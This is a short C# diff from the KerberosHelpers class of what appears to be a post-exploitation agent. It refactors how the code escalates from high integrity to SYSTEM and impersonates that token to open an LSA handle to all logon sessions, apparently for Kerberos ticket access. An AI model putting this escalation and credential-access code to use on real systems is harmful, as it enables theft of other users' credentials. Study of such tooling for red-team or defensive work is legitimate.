@@ -35,7 +35,6 @@ internal class KerberosHelpers
         try
         {
             bool elevated = false;
-            IntPtr _systemHandle = new();
             DebugHelp.DebugWriteLine("Getting LSA Handle");
             //if we are already high integrity, we need to elevate to system to get the handle to all the sessions
             if(Agent.GetIdentityManager().GetIntegrityLevel() is IntegrityLevel.HighIntegrity && elevateToSystem)
@@ -43,18 +42,17 @@ internal class KerberosHelpers
                 //if we have a system handle already, we can use that
                 if(systemHandle.IsNull is false)
                 {
-                    _systemHandle = systemHandle;
                     elevated = true;
                 }
                 else
                 {
-                    (elevated, _systemHandle) = Agent.GetIdentityManager().GetSystem();
+                    elevated = Agent.GetIdentityManager().GetSystem();
                     createdArtifacts.Add(Artifact.PrivilegeEscalation("SYSTEM"));
                 }
                 if (elevated)
                 {
                     systemHandle = new();
-                    ImpersonationScope.Run(new WindowsIdentity(_systemHandle), () =>
+                    ImpersonationScope.Run(Agent.GetIdentityManager().GetCurrentImpersonationIdentity(), () =>
                     {
                         WindowsAPI.LsaConnectUntrustedDelegate(out lsaHandle);
                     });
